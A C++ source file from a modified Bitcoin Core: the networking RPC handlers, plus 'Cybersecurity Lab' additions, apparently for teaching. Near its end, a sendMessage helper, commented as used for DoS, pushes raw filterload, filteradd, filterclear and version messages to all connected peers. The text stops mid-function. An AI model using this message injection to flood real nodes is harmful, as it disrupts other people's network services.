// Copyright (c) 2009-2019 The Bitcoin Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

#include <rpc/server.h>

#include <banman.h>
#include <clientversion.h>
#include <core_io.h>
#include <net.h>
#include <net_permissions.h>
#include <net_processing.h>
#include <net_types.h> // For banmap_t
#include <netbase.h>
#include <node/context.h>
#include <policy/settings.h>
#include <rpc/blockchain.h>
#include <rpc/protocol.h>
#include <rpc/util.h>
#include <sync.h>
#include <timedata.h>
#include <util/strencodings.h>
#include <util/system.h>
#include <validation.h>
#include <version.h>
#include <warnings.h>
#include <blockencodings.h> // Cybersecurity Lab
#include <netmessagemaker.h> // Cybersecurity Lab
#include <merkleblock.h> // Cybersecurity Lab
#include <sstream> // Cybersecurity Lab
#include <vector> // Cybersecurity Lab
#include <ctime> // Cybersecurity Lab

#include <univalue.h>

static UniValue getconnectioncount(const JSONRPCRequest& request)
{
            RPCHelpMan{"getconnectioncount",
                "\nReturns the number of connections to other nodes.\n",
                {},
                RPCResult{
            "n          (numeric) The connection count\n"
                },
                RPCExamples{
                    HelpExampleCli("getconnectioncount", "")
            + HelpExampleRpc("getconnectioncount", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    return (int)g_rpc_node->connman->GetNodeCount(CConnman::CONNECTIONS_ALL);
}

static UniValue ping(const JSONRPCRequest& request)
{
            RPCHelpMan{"ping",
                "\nRequests that a ping be sent to all other nodes, to measure ping time.\n"
                "Results provided in getpeerinfo, pingtime and pingwait fields are decimal seconds.\n"
                "Ping command is handled in queue with all other commands, so it measures processing backlog, not just network ping.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("ping", "")
            + HelpExampleRpc("ping", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    // Request that each node send a ping during next message processing pass
    g_rpc_node->connman->ForEachNode([](CNode* pnode) {
        pnode->fPingQueued = true;
    });
    return NullUniValue;
}

static UniValue getpeerinfo(const JSONRPCRequest& request)
{
            RPCHelpMan{"getpeerinfo",
                "\nReturns data about each connected network node as a json array of objects.\n",
                {},
                RPCResult{
            "[\n"
            "  {\n"
            "    \"id\": n,                   (numeric) Peer index\n"
            "    \"addr\":\"host:port\",      (string) The IP address and port of the peer\n"
            "    \"addrbind\":\"ip:port\",    (string) Bind address of the connection to the peer\n"
            "    \"addrlocal\":\"ip:port\",   (string) Local address as reported by the peer\n"
            "    \"mapped_as\":\"mapped_as\", (string) The AS in the BGP route to the peer used for diversifying peer selection\n"
            "    \"services\":\"xxxxxxxxxxxxxxxx\",   (string) The services offered\n"
            "    \"servicesnames\":[              (array) the services offered, in human-readable form\n"
            "        \"SERVICE_NAME\",         (string) the service name if it is recognised\n"
            "         ...\n"
            "     ],\n"
            "    \"relaytxes\":true|false,    (boolean) Whether peer has asked us to relay transactions to it\n"
            "    \"lastsend\": ttt,           (numeric) The " + UNIX_EPOCH_TIME + " of the last send\n"
            "    \"lastrecv\": ttt,           (numeric) The " + UNIX_EPOCH_TIME + " of the last receive\n"
            "    \"bytessent\": n,            (numeric) The total bytes sent\n"
            "    \"bytesrecv\": n,            (numeric) The total bytes received\n"
            "    \"conntime\": ttt,           (numeric) The " + UNIX_EPOCH_TIME + " of the connection\n"
            "    \"timeoffset\": ttt,         (numeric) The time offset in seconds\n"
            "    \"pingtime\": n,             (numeric) ping time (if available)\n"
            "    \"minping\": n,              (numeric) minimum observed ping time (if any at all)\n"
            "    \"pingwait\": n,             (numeric) ping wait (if non-zero)\n"
            "    \"version\": v,              (numeric) The peer version, such as 70001\n"
            "    \"subver\": \"/Satoshi:0.8.5/\",  (string) The string version\n"
            "    \"inbound\": true|false,     (boolean) Inbound (true) or Outbound (false)\n"
            "    \"addnode\": true|false,     (boolean) Whether connection was due to addnode/-connect or if it was an automatic/inbound connection\n"
            "    \"startingheight\": n,       (numeric) The starting height (block) of the peer\n"
            "    \"banscore\": n,             (numeric) The ban score\n"
            "    \"synced_headers\": n,       (numeric) The last header we have in common with this peer\n"
            "    \"synced_blocks\": n,        (numeric) The last block we have in common with this peer\n"
            "    \"inflight\": [\n"
            "       n,                        (numeric) The heights of blocks we're currently asking from this peer\n"
            "       ...\n"
            "    ],\n"
            "    \"whitelisted\": true|false, (boolean) Whether the peer is whitelisted\n"
            "    \"minfeefilter\": n,         (numeric) The minimum fee rate for transactions this peer accepts\n"
            "    \"bytessent_per_msg\": {\n"
            "       \"msg\": n,               (numeric) The total bytes sent aggregated by message type\n"
            "                               When a message type is not listed in this json object, the bytes sent are 0.\n"
            "                               Only known message types can appear as keys in the object.\n"
            "       ...\n"
            "    },\n"
            "    \"bytesrecv_per_msg\": {\n"
            "       \"msg\": n,               (numeric) The total bytes received aggregated by message type\n"
            "                               When a message type is not listed in this json object, the bytes received are 0.\n"
            "                               Only known message types can appear as keys in the object and all bytes received of unknown message types are listed under '"+NET_MESSAGE_COMMAND_OTHER+"'.\n"
            "       ...\n"
            "    }\n"
            "  }\n"
            "  ,...\n"
            "]\n"
                },
                RPCExamples{
                    HelpExampleCli("getpeerinfo", "")
            + HelpExampleRpc("getpeerinfo", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    UniValue ret(UniValue::VARR);

    for (const CNodeStats& stats : vstats) {
        UniValue obj(UniValue::VOBJ);
        CNodeStateStats statestats;
        bool fStateStats = GetNodeStateStats(stats.nodeid, statestats);
        obj.pushKV("id", stats.nodeid);
        obj.pushKV("addr", stats.addrName);
        if (!(stats.addrLocal.empty()))
            obj.pushKV("addrlocal", stats.addrLocal);
        if (stats.addrBind.IsValid())
            obj.pushKV("addrbind", stats.addrBind.ToString());
        if (stats.m_mapped_as != 0) {
            obj.pushKV("mapped_as", uint64_t(stats.m_mapped_as));
        }
        obj.pushKV("services", strprintf("%016x", stats.nServices));
        obj.pushKV("servicesnames", GetServicesNames(stats.nServices));
        obj.pushKV("relaytxes", stats.fRelayTxes);
        obj.pushKV("lastsend", stats.nLastSend);
        obj.pushKV("lastrecv", stats.nLastRecv);
        obj.pushKV("bytessent", stats.nSendBytes);
        obj.pushKV("bytesrecv", stats.nRecvBytes);
        obj.pushKV("conntime", stats.nTimeConnected);
        obj.pushKV("timeoffset", stats.nTimeOffset);
        if (stats.dPingTime > 0.0)
            obj.pushKV("pingtime", stats.dPingTime);
        if (stats.dMinPing < static_cast<double>(std::numeric_limits<int64_t>::max())/1e6)
            obj.pushKV("minping", stats.dMinPing);
        if (stats.dPingWait > 0.0)
            obj.pushKV("pingwait", stats.dPingWait);
        obj.pushKV("version", stats.nVersion);
        // Use the sanitized form of subver here, to avoid tricksy remote peers from
        // corrupting or modifying the JSON output by putting special characters in
        // their ver message.
        obj.pushKV("subver", stats.cleanSubVer);
        obj.pushKV("inbound", stats.fInbound);
        obj.pushKV("addnode", stats.m_manual_connection);
        obj.pushKV("startingheight", stats.nStartingHeight);
        if (fStateStats) {
            obj.pushKV("banscore", statestats.nMisbehavior);
            obj.pushKV("synced_headers", statestats.nSyncHeight);
            obj.pushKV("synced_blocks", statestats.nCommonHeight);
            UniValue heights(UniValue::VARR);
            for (const int height : statestats.vHeightInFlight) {
                heights.push_back(height);
            }
            obj.pushKV("inflight", heights);
        }
        obj.pushKV("whitelisted", stats.m_legacyWhitelisted);
        UniValue permissions(UniValue::VARR);
        for (const auto& permission : NetPermissions::ToStrings(stats.m_permissionFlags)) {
            permissions.push_back(permission);
        }
        obj.pushKV("permissions", permissions);
        obj.pushKV("minfeefilter", ValueFromAmount(stats.minFeeFilter));

        UniValue sendPerMsgCmd(UniValue::VOBJ);
        for (const auto& i : stats.mapSendBytesPerMsgCmd) {
            if (i.second > 0)
                sendPerMsgCmd.pushKV(i.first, i.second);
        }
        obj.pushKV("bytessent_per_msg", sendPerMsgCmd);

        UniValue recvPerMsgCmd(UniValue::VOBJ);
        for (const auto& i : stats.mapRecvBytesPerMsgCmd) {
            if (i.second > 0)
                recvPerMsgCmd.pushKV(i.first, i.second);
        }
        obj.pushKV("bytesrecv_per_msg", recvPerMsgCmd);

        ret.push_back(obj);
    }

    return ret;
}

static UniValue addnode(const JSONRPCRequest& request)
{
    std::string strCommand;
    if (!request.params[1].isNull())
        strCommand = request.params[1].get_str();
    if (request.fHelp || request.params.size() != 2 ||
        (strCommand != "onetry" && strCommand != "add" && strCommand != "remove"))
        throw std::runtime_error(
            RPCHelpMan{"addnode",
                "\nAttempts to add or remove a node from the addnode list.\n"
                "Or try a connection to a node once.\n"
                "Nodes added using addnode (or -connect) are protected from DoS disconnection and are not required to be\n"
                "full nodes/support SegWit as other outbound peers are (though such peers will not be synced from).\n",
                {
                    {"node", RPCArg::Type::STR, RPCArg::Optional::NO, "The node (see getpeerinfo for nodes)"},
                    {"command", RPCArg::Type::STR, RPCArg::Optional::NO, "'add' to add a node to the list, 'remove' to remove a node from the list, 'onetry' to try a connection to the node once"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("addnode", "\"192.168.0.6:8333\" \"onetry\"")
            + HelpExampleRpc("addnode", "\"192.168.0.6:8333\", \"onetry\"")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string strNode = request.params[0].get_str();

    if (strCommand == "onetry")
    {
        CAddress addr;
        g_rpc_node->connman->OpenNetworkConnection(addr, false, nullptr, strNode.c_str(), false, false, true);
        return NullUniValue;
    }

    if (strCommand == "add")
    {
        if(!g_rpc_node->connman->AddNode(strNode))
            throw JSONRPCError(RPC_CLIENT_NODE_ALREADY_ADDED, "Error: Node already added");
    }
    else if(strCommand == "remove")
    {
        if(!g_rpc_node->connman->RemoveAddedNode(strNode))
            throw JSONRPCError(RPC_CLIENT_NODE_NOT_ADDED, "Error: Node has not been added.");
    }

    return NullUniValue;
}

static UniValue disconnectnode(const JSONRPCRequest& request)
{
            RPCHelpMan{"disconnectnode",
                "\nImmediately disconnects from the specified peer node.\n"
                "\nStrictly one out of 'address' and 'nodeid' can be provided to identify the node.\n"
                "\nTo disconnect by nodeid, either set 'address' to the empty string, or call using the named 'nodeid' argument only.\n",
                {
                    {"address", RPCArg::Type::STR, /* default */ "fallback to nodeid", "The IP address/port of the node"},
                    {"nodeid", RPCArg::Type::NUM, /* default */ "fallback to address", "The node ID (see getpeerinfo for node IDs)"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("disconnectnode", "\"192.168.0.6:8333\"")
            + HelpExampleCli("disconnectnode", "\"\" 1")
            + HelpExampleRpc("disconnectnode", "\"192.168.0.6:8333\"")
            + HelpExampleRpc("disconnectnode", "\"\", 1")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    bool success;
    const UniValue &address_arg = request.params[0];
    const UniValue &id_arg = request.params[1];

    if (!address_arg.isNull() && id_arg.isNull()) {
        /* handle disconnect-by-address */
        success = g_rpc_node->connman->DisconnectNode(address_arg.get_str());
    } else if (!id_arg.isNull() && (address_arg.isNull() || (address_arg.isStr() && address_arg.get_str().empty()))) {
        /* handle disconnect-by-id */
        NodeId nodeid = (NodeId) id_arg.get_int64();
        success = g_rpc_node->connman->DisconnectNode(nodeid);
    } else {
        throw JSONRPCError(RPC_INVALID_PARAMS, "Only one of address and nodeid should be provided.");
    }

    if (!success) {
        throw JSONRPCError(RPC_CLIENT_NODE_NOT_CONNECTED, "Node not found in connected nodes");
    }

    return NullUniValue;
}

static UniValue getaddednodeinfo(const JSONRPCRequest& request)
{
            RPCHelpMan{"getaddednodeinfo",
                "\nReturns information about the given added node, or all added nodes\n"
                "(note that onetry addnodes are not listed here)\n",
                {
                    {"node", RPCArg::Type::STR, /* default */ "all nodes", "If provided, return information about this specific node, otherwise all nodes are returned."},
                },
                RPCResult{
            "[\n"
            "  {\n"
            "    \"addednode\" : \"192.168.0.201\",   (string) The node IP address or name (as provided to addnode)\n"
            "    \"connected\" : true|false,          (boolean) If connected\n"
            "    \"addresses\" : [                    (list of objects) Only when connected = true\n"
            "       {\n"
            "         \"address\" : \"192.168.0.201:8333\",  (string) The bitcoin server IP and port we're connected to\n"
            "         \"connected\" : \"outbound\"           (string) connection, inbound or outbound\n"
            "       }\n"
            "     ]\n"
            "  }\n"
            "  ,...\n"
            "]\n"
                },
                RPCExamples{
                    HelpExampleCli("getaddednodeinfo", "\"192.168.0.201\"")
            + HelpExampleRpc("getaddednodeinfo", "\"192.168.0.201\"")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<AddedNodeInfo> vInfo = g_rpc_node->connman->GetAddedNodeInfo();

    if (!request.params[0].isNull()) {
        bool found = false;
        for (const AddedNodeInfo& info : vInfo) {
            if (info.strAddedNode == request.params[0].get_str()) {
                vInfo.assign(1, info);
                found = true;
                break;
            }
        }
        if (!found) {
            throw JSONRPCError(RPC_CLIENT_NODE_NOT_ADDED, "Error: Node has not been added.");
        }
    }

    UniValue ret(UniValue::VARR);

    for (const AddedNodeInfo& info : vInfo) {
        UniValue obj(UniValue::VOBJ);
        obj.pushKV("addednode", info.strAddedNode);
        obj.pushKV("connected", info.fConnected);
        UniValue addresses(UniValue::VARR);
        if (info.fConnected) {
            UniValue address(UniValue::VOBJ);
            address.pushKV("address", info.resolvedAddress.ToString());
            address.pushKV("connected", info.fInbound ? "inbound" : "outbound");
            addresses.push_back(address);
        }
        obj.pushKV("addresses", addresses);
        ret.push_back(obj);
    }

    return ret;
}

static UniValue getnettotals(const JSONRPCRequest& request)
{
            RPCHelpMan{"getnettotals",
                "\nReturns information about network traffic, including bytes in, bytes out,\n"
                "and current time.\n",
                {},
                RPCResult{
            "{\n"
            "  \"totalbytesrecv\": n,   (numeric) Total bytes received\n"
            "  \"totalbytessent\": n,   (numeric) Total bytes sent\n"
            "  \"timemillis\": t,       (numeric) Current UNIX time in milliseconds\n"
            "  \"uploadtarget\":\n"
            "  {\n"
            "    \"timeframe\": n,                         (numeric) Length of the measuring timeframe in seconds\n"
            "    \"target\": n,                            (numeric) Target in bytes\n"
            "    \"target_reached\": true|false,           (boolean) True if target is reached\n"
            "    \"serve_historical_blocks\": true|false,  (boolean) True if serving historical blocks\n"
            "    \"bytes_left_in_cycle\": t,               (numeric) Bytes left in current time cycle\n"
            "    \"time_left_in_cycle\": t                 (numeric) Seconds left in current time cycle\n"
            "  }\n"
            "}\n"
                },
                RPCExamples{
                    HelpExampleCli("getnettotals", "")
            + HelpExampleRpc("getnettotals", "")
                },
            }.Check(request);
    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    UniValue obj(UniValue::VOBJ);
    obj.pushKV("totalbytesrecv", g_rpc_node->connman->GetTotalBytesRecv());
    obj.pushKV("totalbytessent", g_rpc_node->connman->GetTotalBytesSent());
    obj.pushKV("timemillis", GetTimeMillis());

    UniValue outboundLimit(UniValue::VOBJ);
    outboundLimit.pushKV("timeframe", g_rpc_node->connman->GetMaxOutboundTimeframe());
    outboundLimit.pushKV("target", g_rpc_node->connman->GetMaxOutboundTarget());
    outboundLimit.pushKV("target_reached", g_rpc_node->connman->OutboundTargetReached(false));
    outboundLimit.pushKV("serve_historical_blocks", !g_rpc_node->connman->OutboundTargetReached(true));
    outboundLimit.pushKV("bytes_left_in_cycle", g_rpc_node->connman->GetOutboundTargetBytesLeft());
    outboundLimit.pushKV("time_left_in_cycle", g_rpc_node->connman->GetMaxOutboundTimeLeftInCycle());
    obj.pushKV("uploadtarget", outboundLimit);
    return obj;
}

static UniValue GetNetworksInfo()
{
    UniValue networks(UniValue::VARR);
    for(int n=0; n<NET_MAX; ++n)
    {
        enum Network network = static_cast<enum Network>(n);
        if(network == NET_UNROUTABLE || network == NET_INTERNAL)
            continue;
        proxyType proxy;
        UniValue obj(UniValue::VOBJ);
        GetProxy(network, proxy);
        obj.pushKV("name", GetNetworkName(network));
        obj.pushKV("limited", !IsReachable(network));
        obj.pushKV("reachable", IsReachable(network));
        obj.pushKV("proxy", proxy.IsValid() ? proxy.proxy.ToStringIPPort() : std::string());
        obj.pushKV("proxy_randomize_credentials", proxy.randomize_credentials);
        networks.push_back(obj);
    }
    return networks;
}

static UniValue getnetworkinfo(const JSONRPCRequest& request)
{
            RPCHelpMan{"getnetworkinfo",
                "Returns an object containing various state info regarding P2P networking.\n",
                {},
                RPCResult{
            "{                                        (json object)\n"
            "  \"version\": xxxxx,                      (numeric) the server version\n"
            "  \"subversion\" : \"str\",                  (string) the server subversion string\n"
            "  \"protocolversion\": xxxxx,              (numeric) the protocol version\n"
            "  \"localservices\" : \"hex\",               (string) the services we offer to the network\n"
            "  \"localservicesnames\": [                (array) the services we offer to the network, in human-readable form\n"
            "      \"SERVICE_NAME\",                    (string) the service name\n"
            "       ...\n"
            "   ],\n"
            "  \"localrelay\": true|false,              (bool) true if transaction relay is requested from peers\n"
            "  \"timeoffset\": xxxxx,                   (numeric) the time offset\n"
            "  \"connections\": xxxxx,                  (numeric) the number of connections\n"
            "  \"networkactive\": true|false,           (bool) whether p2p networking is enabled\n"
            "  \"networks\": [                          (array) information per network\n"
            "  {                                      (json object)\n"
            "    \"name\": \"str\",                       (string) network (ipv4, ipv6 or onion)\n"
            "    \"limited\": true|false,               (boolean) is the network limited using -onlynet?\n"
            "    \"reachable\": true|false,             (boolean) is the network reachable?\n"
            "    \"proxy\" : \"str\"                      (string) (\"host:port\") the proxy that is used for this network, or empty if none\n"
            "    \"proxy_randomize_credentials\" : true|false,  (bool) Whether randomized credentials are used\n"
            "  },\n"
            "  ...\n"
            "  ],\n"
            "  \"relayfee\": x.xxxxxxxx,                (numeric) minimum relay fee for transactions in " + CURRENCY_UNIT + "/kB\n"
            "  \"incrementalfee\": x.xxxxxxxx,          (numeric) minimum fee increment for mempool limiting or BIP 125 replacement in " + CURRENCY_UNIT + "/kB\n"
            "  \"localaddresses\": [                    (array) list of local addresses\n"
            "  {                                      (json object)\n"
            "    \"address\" : \"xxxx\",                  (string) network address\n"
            "    \"port\": xxx,                         (numeric) network port\n"
            "    \"score\": xxx                         (numeric) relative score\n"
            "  },\n"
            "  ...\n"
            "  ],\n"
            "  \"warnings\" : \"str\",                     (string) any network and blockchain warnings\n"
            "}\n"
                },
                RPCExamples{
                    HelpExampleCli("getnetworkinfo", "")
            + HelpExampleRpc("getnetworkinfo", "")
                },
            }.Check(request);

    LOCK(cs_main);
    UniValue obj(UniValue::VOBJ);
    obj.pushKV("version",       CLIENT_VERSION);
    obj.pushKV("subversion",    strSubVersion);
    obj.pushKV("protocolversion",PROTOCOL_VERSION);
    if (g_rpc_node->connman) {
        ServiceFlags services = g_rpc_node->connman->GetLocalServices();
        obj.pushKV("localservices", strprintf("%016x", services));
        obj.pushKV("localservicesnames", GetServicesNames(services));
    }
    obj.pushKV("localrelay", g_relay_txes);
    obj.pushKV("timeoffset",    GetTimeOffset());
    if (g_rpc_node->connman) {
        obj.pushKV("networkactive", g_rpc_node->connman->GetNetworkActive());
        obj.pushKV("connections",   (int)g_rpc_node->connman->GetNodeCount(CConnman::CONNECTIONS_ALL));
    }
    obj.pushKV("networks",      GetNetworksInfo());
    obj.pushKV("relayfee",      ValueFromAmount(::minRelayTxFee.GetFeePerK()));
    obj.pushKV("incrementalfee", ValueFromAmount(::incrementalRelayFee.GetFeePerK()));
    UniValue localAddresses(UniValue::VARR);
    {
        LOCK(cs_mapLocalHost);
        for (const std::pair<const CNetAddr, LocalServiceInfo> &item : mapLocalHost)
        {
            UniValue rec(UniValue::VOBJ);
            rec.pushKV("address", item.first.ToString());
            rec.pushKV("port", item.second.nPort);
            rec.pushKV("score", item.second.nScore);
            localAddresses.push_back(rec);
        }
    }
    obj.pushKV("localaddresses", localAddresses);
    obj.pushKV("warnings",       GetWarnings(false));
    return obj;
}

static UniValue setban(const JSONRPCRequest& request)
{
    const RPCHelpMan help{"setban",
                "\nAttempts to add or remove an IP/Subnet from the banned list.\n",
                {
                    {"subnet", RPCArg::Type::STR, RPCArg::Optional::NO, "The IP/Subnet (see getpeerinfo for nodes IP) with an optional netmask (default is /32 = single IP)"},
                    {"command", RPCArg::Type::STR, RPCArg::Optional::NO, "'add' to add an IP/Subnet to the list, 'remove' to remove an IP/Subnet from the list"},
                    {"bantime", RPCArg::Type::NUM, /* default */ "0", "time in seconds how long (or until when if [absolute] is set) the IP is banned (0 or empty means using the default time of 24h which can also be overwritten by the -bantime startup argument)"},
                    {"absolute", RPCArg::Type::BOOL, /* default */ "false", "If set, the bantime must be an absolute timestamp expressed in " + UNIX_EPOCH_TIME},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("setban", "\"192.168.0.6\" \"add\" 86400")
                            + HelpExampleCli("setban", "\"192.168.0.0/24\" \"add\"")
                            + HelpExampleRpc("setban", "\"192.168.0.6\", \"add\", 86400")
                },
    };
    std::string strCommand;
    if (!request.params[1].isNull())
        strCommand = request.params[1].get_str();
    if (request.fHelp || !help.IsValidNumArgs(request.params.size()) || (strCommand != "add" && strCommand != "remove")) {
        throw std::runtime_error(help.ToString());
    }
    if (!g_rpc_node->banman) {
        throw JSONRPCError(RPC_DATABASE_ERROR, "Error: Ban database not loaded");
    }

    CSubNet subNet;
    CNetAddr netAddr;
    bool isSubnet = false;

    if (request.params[0].get_str().find('/') != std::string::npos)
        isSubnet = true;

    if (!isSubnet) {
        CNetAddr resolved;
        LookupHost(request.params[0].get_str(), resolved, false);
        netAddr = resolved;
    }
    else
        LookupSubNet(request.params[0].get_str(), subNet);

    if (! (isSubnet ? subNet.IsValid() : netAddr.IsValid()) )
        throw JSONRPCError(RPC_CLIENT_INVALID_IP_OR_SUBNET, "Error: Invalid IP/Subnet");

    if (strCommand == "add")
    {
        if (isSubnet ? g_rpc_node->banman->IsBanned(subNet) : g_rpc_node->banman->IsBanned(netAddr)) {
            throw JSONRPCError(RPC_CLIENT_NODE_ALREADY_ADDED, "Error: IP/Subnet already banned");
        }

        int64_t banTime = 0; //use standard bantime if not specified
        if (!request.params[2].isNull())
            banTime = request.params[2].get_int64();

        bool absolute = false;
        if (request.params[3].isTrue())
            absolute = true;

        if (isSubnet) {
            g_rpc_node->banman->Ban(subNet, BanReasonManuallyAdded, banTime, absolute);
            if (g_rpc_node->connman) {
                g_rpc_node->connman->DisconnectNode(subNet);
            }
        } else {
            g_rpc_node->banman->Ban(netAddr, BanReasonManuallyAdded, banTime, absolute);
            if (g_rpc_node->connman) {
                g_rpc_node->connman->DisconnectNode(netAddr);
            }
        }
    }
    else if(strCommand == "remove")
    {
        if (!( isSubnet ? g_rpc_node->banman->Unban(subNet) : g_rpc_node->banman->Unban(netAddr) )) {
            throw JSONRPCError(RPC_CLIENT_INVALID_IP_OR_SUBNET, "Error: Unban failed. Requested address/subnet was not previously banned.");
        }
    }
    return NullUniValue;
}

static UniValue listbanned(const JSONRPCRequest& request)
{
            RPCHelpMan{"listbanned",
                "\nList all banned IPs/Subnets.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("listbanned", "")
                            + HelpExampleRpc("listbanned", "")
                },
            }.Check(request);

    if(!g_rpc_node->banman) {
        throw JSONRPCError(RPC_DATABASE_ERROR, "Error: Ban database not loaded");
    }

    banmap_t banMap;
    g_rpc_node->banman->GetBanned(banMap);

    UniValue bannedAddresses(UniValue::VARR);
    for (const auto& entry : banMap)
    {
        const CBanEntry& banEntry = entry.second;
        UniValue rec(UniValue::VOBJ);
        rec.pushKV("address", entry.first.ToString());
        rec.pushKV("banned_until", banEntry.nBanUntil);
        rec.pushKV("ban_created", banEntry.nCreateTime);
        rec.pushKV("ban_reason", banEntry.banReasonToString());

        bannedAddresses.push_back(rec);
    }

    return bannedAddresses;
}

static UniValue clearbanned(const JSONRPCRequest& request)
{
            RPCHelpMan{"clearbanned",
                "\nClear all banned IPs.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("clearbanned", "")
                            + HelpExampleRpc("clearbanned", "")
                },
            }.Check(request);
    if (!g_rpc_node->banman) {
        throw JSONRPCError(RPC_DATABASE_ERROR, "Error: Ban database not loaded");
    }

    g_rpc_node->banman->ClearBanned();

    return NullUniValue;
}

static UniValue setnetworkactive(const JSONRPCRequest& request)
{
            RPCHelpMan{"setnetworkactive",
                "\nDisable/enable all p2p network activity.\n",
                {
                    {"state", RPCArg::Type::BOOL, RPCArg::Optional::NO, "true to enable networking, false to disable"},
                },
                RPCResults{},
                RPCExamples{""},
            }.Check(request);

    if (!g_rpc_node->connman) {
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");
    }

    g_rpc_node->connman->SetNetworkActive(request.params[0].get_bool());

    return g_rpc_node->connman->GetNetworkActive();
}

static UniValue getnodeaddresses(const JSONRPCRequest& request)
{
            RPCHelpMan{"getnodeaddresses",
                "\nReturn known addresses which can potentially be used to find new nodes in the network\n",
                {
                    {"count", RPCArg::Type::NUM, /* default */ "1", "How many addresses to return. Limited to the smaller of " + std::to_string(ADDRMAN_GETADDR_MAX) + " or " + std::to_string(ADDRMAN_GETADDR_MAX_PCT) + "% of all known addresses."},
                },
                RPCResult{
            "[\n"
            "  {\n"
            "    \"time\": ttt,                (numeric) The " + UNIX_EPOCH_TIME + " of when the node was last seen\n"
            "    \"services\": n,              (numeric) The services offered\n"
            "    \"address\": \"host\",          (string) The address of the node\n"
            "    \"port\": n                   (numeric) The port of the node\n"
            "  }\n"
            "  ,....\n"
            "]\n"
                },
                RPCExamples{
                    HelpExampleCli("getnodeaddresses", "8")
            + HelpExampleRpc("getnodeaddresses", "8")
                },
            }.Check(request);
    if (!g_rpc_node->connman) {
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");
    }

    int count = 1;
    if (!request.params[0].isNull()) {
        count = request.params[0].get_int();
        if (count <= 0) {
            throw JSONRPCError(RPC_INVALID_PARAMETER, "Address count out of range");
        }
    }
    // returns a shuffled list of CAddress
    std::vector<CAddress> vAddr = g_rpc_node->connman->GetAddresses();
    UniValue ret(UniValue::VARR);

    int address_return_count = std::min<int>(count, vAddr.size());
    for (int i = 0; i < address_return_count; ++i) {
        UniValue obj(UniValue::VOBJ);
        const CAddress& addr = vAddr[i];
        obj.pushKV("time", (int)addr.nTime);
        obj.pushKV("services", (uint64_t)addr.nServices);
        obj.pushKV("address", addr.ToStringIP());
        obj.pushKV("port", addr.GetPort());
        ret.push_back(obj);
    }
    return ret;
}


// Cybersecurity Lab
// Used by DoS and send
static UniValue sendMessage(std::string msg, std::string rawArgs, bool printResult)
{
    std::vector<std::string> args;
    std::stringstream ss(rawArgs);
    std::string item;
    while (getline(ss, item, ',')) {
        args.push_back(item);
    }

    // Timer start
    clock_t begin = clock();

    CSerializedNetMsg netMsg;

    std::string outputMessage = "";
    g_rpc_node->connman->ForEachNode([&msg, &args, &netMsg, &outputMessage](CNode* pnode) {
        LOCK(pnode->cs_inventory);

        if (msg == "filterload") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERLOAD);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERLOAD));

        } else if(msg == "filteradd") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERADD);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERADD));

        } else if(msg == "filterclear") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERCLEAR);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FILTERCLEAR));

        } else if(msg == "version") {
          ServiceFlags nLocalNodeServices = pnode->GetLocalServices();
          int64_t nTime = GetTime();
          //uint64_t nonce = pnode->GetLocalNonce();
          uint64_t nonce = 0;
          while (nonce == 0) {
              GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
          }
          int nNodeStartingHeight = pnode->GetMyStartingHeight();
          //NodeId nodeid = pnode->GetId();
          CAddress addr = pnode->addr;
          CAddress addrYou = (addr.IsRoutable() && !IsProxy(addr) ? addr : CAddress(CService(), addr.nServices));
          CAddress addrMe = CAddress(CService(), nLocalNodeServices);
          bool announceRelayTxes = true;

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERSION, PROTOCOL_VERSION, (uint64_t)nLocalNodeServices, nTime, addrYou, addrMe, nonce, strSubVersion, nNodeStartingHeight, announceRelayTxes);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERSION));
          //netMsg = CNetMsgMaker(70012).Make(NetMsgType::VERSION, PROTOCOL_VERSION, (uint64_t)nLocalNodeServices, nTime, addrYou, addrMe, nonce, strSubVersion, nNodeStartingHeight, announceRelayTxes);
          //g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(70012).Make(NetMsgType::VERSION));

        } else if(msg == "verack") {
